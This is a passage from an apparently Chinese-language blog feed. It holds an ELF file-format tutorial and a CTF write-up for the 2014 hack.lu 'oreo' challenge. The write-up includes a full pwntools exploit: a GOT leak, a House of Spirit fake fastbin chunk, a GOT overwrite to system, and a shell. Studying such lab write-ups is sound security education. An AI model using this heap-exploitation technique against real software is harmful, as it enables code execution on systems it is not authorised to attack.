id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h3><p>可修改</p><p>系统版本</p><h3 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h3><p>不可修改</p><p>系统转交控制权给 ELF 中相应代码的虚拟地址,也就是给pc的值，很重要 ,可以做入口点hook</p><h3 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h3><p>不可修改</p><p>Program Header table OFFset</p><p>程序头部表在elf中的偏移</p><h3 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h3><p>可修改</p><p>Section Header table OFFset</p><p>节头表在elf中偏移</p><h3 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h3><p>可修改</p><p>具体架构版本</p><h3 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h3><p>可修改</p><p>ELF HEADER 长度</p><h3 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h3><p>不可修改</p><p>Program Header ENTry SIZE</p><p>program header table是个结构体数组，参数描述结构体大小</p><h3 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h3><p>不可修改</p><p>Program Header entry NUMber</p><p>program header table结构体个数</p><h3 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h3><p>可修改</p><p>Section Header ENTry SIZE</p><p>section结构体大小</p><h3 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h3><p>可修改</p><p>Section Header NUMber</p><p>section结构体个数</p><h3 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h3><p>可修改</p><p><strong>关于Program Header table 的项基本都不可以改，Section Header Table基本可改，不影响执行</strong></p><h2 id="Program-Header-table"><a href="#Program-Header-table" class="headerlink" title="Program Header table"></a>Program Header table</h2><p><strong>程序的头部只有对于可执行文件和共享目标文件有意义。</strong></p><ul><li>程序头表&#x2F;段表（Program header table）<ul><li>告诉系统如何创建进程</li><li>生成进程的可执行文件必须拥有此结构</li><li>重定位文件不一定需要</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    p_type;<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word    p_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off    p_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr    p_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr    p_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword    p_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword    p_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword    p_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="p-type"><a href="#p-type" class="headerlink" title="p_type"></a>p_type</h3><p>PT_LOAD  1  此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余” 的字节都要被置为 0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。</p><p>PT_GNU_RELRO 用于指示 GNU ld linker 链接器如何将某些段放置到进程地址空间中以实现地址空间的保护。<code>PT_GNU_RELRO</code> 中的 <code>RELRO</code> 是 “RELocation Read-Only” 的缩写。它指定了一个区段，该区段包含了程序的只读数据段 (如 .rodata) 中所有的全局偏移表 (Global Offset Table，简称 GOT) 和重定位表 (Relocation Table)，并将这个区段设置为只读。这样做的目的是防止程序在运行时被攻击者利用 GOT 篡改，提高程序的安全性。</p><p>我们只关注一下需要加载到内存的段就可以 </p><h3 id="以ls-program-head-table-为例分析"><a href="#以ls-program-head-table-为例分析" class="headerlink" title="以ls program head table 为例分析"></a>以ls program head table 为例分析</h3><p><img src="/2023/03/19/23-2-21-elf/image-20230223004348967.png" alt="image-20230223004348967"></p><p>可以看到有四个段需要加载到内存的可加载段，在此之前，需要有两个段(&#x3D;&#x3D;静态链接不需要&#x3D;&#x3D;)，一个是Program Header 另一个是 Interpreter Path(解释器路径)</p><ul><li><p>Program Header</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223163500827.png" alt="image-20230223163500827"></p><p>对程序加载又有的只有p_offset_FROM_FILE_BEGIN和p_vaddr_virtual_addrees这两个值又必须和ELF Header里的e_phoff一样，这样做是为了在解析elf时如果给的文件指针是program header table地址，而又需要elf header时(比如需要程序入口点)，将该指针减去这个offset就可以找到elf header，毕竟只有elf header位置固定在文件开头</p></li><li><p>Interpreter Path</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223165238248.png" alt="image-20230223165238248"></p><p>表示在文件偏移offset 为0x318的位置读取LENGTH为28字节的解释器地址，来加载下面的loadable段到进程内存</p><p><code>/lib64/ld-linux-x86-64.so.2</code> 是 Linux x86-64 系统下的动态链接器（dynamic linker）文件，它的主要作用是在程序运行时，将程序所需的共享库（shared library）加载到内存中，并将这些共享库中未定义的符号与程序中定义的符号进行链接，从而使程序能够正常执行。</p></li><li><p>Loadable segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230309185924942.png" alt="image-20230309185924942"></p><p>利用mmap向pie+virtual_address处映射从file_begin开始raw_length大小的数据，前面映射必须从页对齐开始，后面必须按4096对齐(页对齐)结束</p></li><li><p>Dynamic segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318221408017.png" alt="image-20230318221408017"></p><p>这里面保存了动态链接器所需的基本信息，如依赖于哪些共享对象、动态链接符号表的位置、共享对象初始化代码的地址等</p><p>从这里开始我们已经把磁盘上的文件加载到了内存，也就是说我们不会再用到这里的任何和文件相关的地址</p><p>这个段标记的数据，也是一个结构体数组，如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;<span class="comment">/* Dynamic entry type *64位程序占8bit 用于区分各种指定信息类型的标记，该结构中的共用体根据该标志进行解释/</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span>位程序占<span class="number">8b</span>it 或者保存一个虚拟地址，或者保存一个整数，可以根据特定的标志进行解释。</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL        0<span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED    1<span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ    2<span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT    3<span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH        4<span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB    5<span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB    6<span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA        7<span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ    8<span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT    9<span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ    10<span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT    11<span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME    14<span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RPATH    15<span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMBOLIC    16<span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_REL        17<span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELSZ    18<span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELENT    19<span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTREL    20<span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEBUG    21<span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TEXTREL    22<span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_JMPREL    23<span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_BIND_NOW24<span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RUNPATH    29<span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FLAGS    30<span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ENCODING    32<span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAY 32        <span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAYSZ 33        <span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB_SHNDX    34<span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_NUM35<span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOOS        0x6000000d<span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIOS        0x6ffff000<span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOPROC    0x70000000<span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIPROC    0x7fffffff<span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PROCNUMDT_MIPS_NUM<span class="comment">/* Most used by any processor */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGLO    0x6ffffe00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_HASH    0x6ffffef5<span class="comment">/* GNU-style hash table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_PLT    0x6ffffef6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_GOT    0x6ffffef7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_CONFLICT    0x6ffffef8<span class="comment">/* Start of conflict section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_LIBLIST    0x6ffffef9<span class="comment">/* Library list */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_CONFIG    0x6ffffefa<span class="comment">/* Configuration information.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEPAUDIT    0x6ffffefb<span class="comment">/* Dependency auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_AUDIT    0x6ffffefc<span class="comment">/* Object auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PLTPAD0x6ffffefd<span class="comment">/* PLT padding.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_MOVETAB0x6ffffefe<span class="comment">/* Move table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMINFO    0x6ffffeff<span class="comment">/* Syminfo table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGHI    0x6ffffeff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRTAGIDX(tag)    (DT_ADDRRNGHI - (tag))<span class="comment">/* Reverse order! */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRNUM 11</span></span><br></pre></td></tr></table></figure><ul><li><p>字符串表地址d_tag&#x3D;5的地址，后面八位就是地址，其实section里的.dynstr也能找到，但是不一定准确，因为我们程序加载执行时那个setion无用</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318230730833.png" alt="image-20230318230730833"></p><img src="/2023/03/19/23-2-21-elf/image-20230318230858470.png" alt="image-20230318230858470" style="zoom:67%;"></li><li><p>导入库表d_tag&#x3D;1 后面时字符串表的偏移，可能不止一个导入库表</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231041729.png" alt="image-20230318231041729"></p><p>0x1040+0x0542&#x3D;0x1582 0x1040+0x0552&#x3D;0x1592</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231247771.png" alt="image-20230318231247771"></p></li><li><p>符号表 d_tag&#x3D;6 对应section .dynsym</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318232353517.png" alt="image-20230318232353517"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;<span class="number">4</span><span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="number">1</span><span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;    <span class="number">1</span><span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section    st_shndx;<span class="number">2</span><span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;<span class="number">8</span><span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword    st_size;<span class="number">8</span><span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;                <span class="number">24</span></span><br></pre></td></tr></table></figure></li><li><p>导入表 d_tag&#x3D;23&#x3D;0x17</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319004444739.png" alt="image-20230319004444739"></p><p>导入表的size在d_tag&#x3D;2处</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319004959046.png" alt="image-20230319004959046"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;<span class="number">8</span><span class="comment">/* Address */</span>，写入导入地址，也就是got表</span><br><span class="line">  Elf64_Xword    r_info;<span class="number">8</span><span class="comment">/* Relocation type and symbol index */</span>前<span class="number">32</span>位存储着重定位类型信息，后<span class="number">32</span>位存储着符号表索引从<span class="number">1</span>开始</span><br><span class="line">  Elf64_Sxword    r_addend;<span class="number">8</span><span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>选取一个分析</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014528225.png" alt="image-20230319014528225"></p><p>符号表</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014737236.png" alt="image-20230319014737236"></p><p>字符串表0x1040+0x344&#x3D;1384</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014926764.png" alt="image-20230319014926764"></p><p>ida</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319015029874.png" alt="image-20230319015029874"></p></li><li><p>重定位表 d_tag&#x3D;7 size在d_tag&#x3D;8</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319123925728.png" alt="image-20230319123925728"></p><p>结构和导入表一样</p></li><li><p>哈希表 #define DT_GNU_HASH0x6ffffef5&#x2F;* GNU-style hash table.  *&#x2F;</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319134353748.png" alt="image-20230319134353748"></p><p>用于加速符号查找，在 DT_GNU_HASH 中，符号名称被哈希到一个桶中，每个桶中保存了一个指向符号表的指针。当需要查找符号时，动态链接器可以使用哈希表来快速定位符号的位置，而不需要遍历整个符号表。</p></li></ul></li><li><p>Read-only After Relocation</p><p>加载到内存重定位后最后一个segment还会指导进行只读改写<img src="/2023/03/19/23-2-21-elf/image-20230223005339928.png" alt="image-20230223005339928"></p></li></ul><p>​从0x232b0开始memsz 3208个byte为只读</p><h2 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h2><ul><li>节头表（Section header table）<ul><li>记录了ELF文件的节区信息</li><li>用于链接的目标文件必须拥有此结构</li><li>其它类型目标文件不一定需要</li></ul></li></ul><p>section Header Table内容对程序执行完全不影响，可以完全改掉，正常执行(这个也和动态linker版本有关)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">// 节名称在 .shstrtab 节中的索引</span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// 节类型</span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// 节标志</span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// 节的内存地址</span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// 节在文件中的偏移量</span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// 节的大小（字节数）</span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// 链接到的其他节的索引</span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// 额外信息</span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// 对齐方式</span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// 节包含实体的大小</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/19/23-2-21-elf/image-20230222232634953.png" alt="image-20230222232634953"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Spirit 2014 hack.lu oreo</title>
      <link href="/2023/03/17/2014-hack-lu-oreo/"/>
      <url>/2023/03/17/2014-hack-lu-oreo/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec oreo</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/oreo&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo</a></p><h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>add函数里存在溢出漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure><p>往name和的script里面都是读了56个字节，都可以溢出</p><p>覆盖next为putsgot在show函数里可以在第二次打印时泄露</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048774                 mov     eax, [ebp+var_14]</span><br><span class="line">.text:08048777                 mov     [esp+4], eax</span><br><span class="line">.text:0804877B                 mov     dword ptr [esp], offset aDescriptionS ; &quot;Description: %s\n&quot;</span><br><span class="line">.text:08048782                 call    _printf</span><br></pre></td></tr></table></figure><p>这里直接把eax里内容next地址放到eax，可以%s解析got打印出来</p><p>puts_got&#x3D;elf.got[‘puts’]<br>payload1 &#x3D; b’a’*27+p32(puts_got)<br>add(b’a’*25,payload1)<br>show_rifle()</p><h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p>这里需要绕过一些检测</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><p>这里我们可以控制next，可以free(next),可以修改notice，而且notice指针上面就可以控制size大小，天生的伪造，再申请控制0804A2A8</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bss:0804A2A4 rifle_cnt       dd ?                    ; DATA XREF: add+C5↑r</span><br><span class="line">.bss:0804A2A4                                         ; add+CD↑w ...</span><br><span class="line">.bss:0804A2A8 ; char *notice</span><br><span class="line">.bss:0804A2A8 notice          dd ?                    ; DATA XREF: message+23↑r</span><br><span class="line">.bss:0804A2A8                                         ; message+3C↑r ...</span><br></pre></td></tr></table></figure><p>我们申请只能在add函数里面malloc(0x38),也就是说size必须控制为0x38+0x8来申请，这样我们申请0x40个chunk，再控制最后一个next指针指向0804A2A8，这个伪造chunk next域必须为空，防止free chunk-&gt;next，这里是往0804A2A8里面的地址0804A2c0去写数据</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230318005107301.png" alt="image-20230318005107301"></p><p>，padding0x20，即可满足到底下一个fake chunk，将其prev size和size改为满足条件即可</p><p>再集体free掉，fastbin先进先出，再次申请一个就可以拿到0804A2A0处的chunk，改写__isoc99_sscanfgot即可</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230317234423315.png" alt="image-20230317234423315"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./oreo&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">descrip, name</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.sendline(descrip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_rifle</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">notice</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendline(notice)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x08048748&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(puts_got)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload1)</span><br><span class="line">show_rifle()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3e</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>*<span class="number">25</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">27</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x41</span>)+p32(<span class="number">0x50</span>)</span><br><span class="line">message(payload3)</span><br><span class="line">order()</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">sscanf_got = elf.got[<span class="string">&#x27;__isoc99_sscanf&#x27;</span>]</span><br><span class="line">add(p32(sscanf_got),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">message(p32(system_addr))</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 insomni&#39;hack wheelofrobots</title>
      <link href="/2023/03/16/2017-insomn-hack-wheelofrobots/"/>
      <url>/2023/03/16/2017-insomn-hack-wheelofrobots/</url>
      
